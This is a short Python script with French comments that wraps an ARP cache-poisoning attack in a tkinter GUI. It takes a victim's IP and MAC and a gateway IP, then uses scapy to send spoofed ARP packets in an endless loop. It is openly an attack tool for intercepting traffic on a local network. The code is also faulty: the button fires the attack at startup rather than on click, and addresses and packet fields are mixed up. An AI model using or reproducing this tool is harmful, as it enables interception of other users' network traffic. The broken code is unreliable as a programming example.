#-*-coding:Latin-1-*
from tkinter import *
from tkinter.messagebox import *
from scapy.all import *

def fonctionscapy(a,b,c):
    send( Ether(dst=ipclient)/ARP(op="who-has", psrc=macclient, pdst=gateway),inter=RandNum(10,40), loop=1)

Mafenetre = Tk()
Mafenetre.title('ARP cache poisoning avec scapy')

# création d'un widget Frame dans la fenêtre principale
Frame1 = Frame(Mafenetre,borderwidth=2,relief=GROOVE)
Frame1.pack(side=LEFT,padx=10,pady=10)

# création d'un second widget Frame dans la fenêtre principale
Frame2 = Frame(Mafenetre,borderwidth=2,relief=GROOVE)
Frame2.pack(side=LEFT,padx=10,pady=10)
Frame3 = Frame(Mafenetre,borderwidth=2,relief=GROOVE)
Frame3.pack(side=LEFT,padx=10,pady=10)

# création d'un widget Label dans un widget frame
Label(Frame1,text="Entrez l'adresse IP du client").pack(padx=10,pady=10)
Label(Frame2,text="Entrez l'adresse MAC du client").pack(padx=10,pady=10)
Label(Frame3,text="Entrez l'adresse ip de la Gateway").pack(padx=10,pady=10)

# Création d'un widget Entry (champ de saisie)
ipclient = StringVar()
Champ = Entry(Frame1, textvariable = ipclient, bg ='bisque', fg='maroon')
Champ.focus_set()
Champ.pack(side = BOTTOM, padx = 5, pady = 5)


macclient = StringVar()
Champ2 = Entry(Frame2, textvariable = macclient, bg = 'bisque', fg='maroon')
Champ2.focus_set()
Champ2.pack(side = BOTTOM, padx = 5, pady = 5)

gateway = StringVar()
Champ3 = Entry(Frame3, textvariable = gateway, bg ='bisque', fg='maroon')
Champ3.focus_set()
Champ3.pack(side = BOTTOM, padx = 5, pady = 5)

a=Champ.get()
b=Champ2.get()
c=Champ3.get()


# Création d'un widget Button (bouton Valider)
Bouton = Button(Mafenetre, text ='Valider', command = fonctionscapy(Champ.get(),Champ2.get(),Champ3.get()))
Bouton.pack(side = BOTTOM, padx = 5, pady = 5)




Mafenetre.mainloop()
